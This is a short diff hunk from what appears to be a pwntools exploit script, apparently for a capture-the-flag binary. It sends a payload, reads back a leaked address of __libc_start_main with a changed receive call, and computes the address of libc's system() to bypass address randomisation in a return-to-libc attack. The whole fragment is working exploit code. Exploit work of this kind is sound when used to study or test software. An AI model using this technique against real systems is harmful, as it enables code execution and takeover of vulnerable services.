@@ -21,7 +21,7 @@ print rop.dump()
 
 io.send(payload1)
 
-buf = io.recv(4096)
+buf = io.readrepeat(timeout=0.5)
 lib_main_add = u32(buf[-4:])
 
 system_add = lib_main_add - libc.symbols["__libc_start_main"] + libc.symbols["system"]
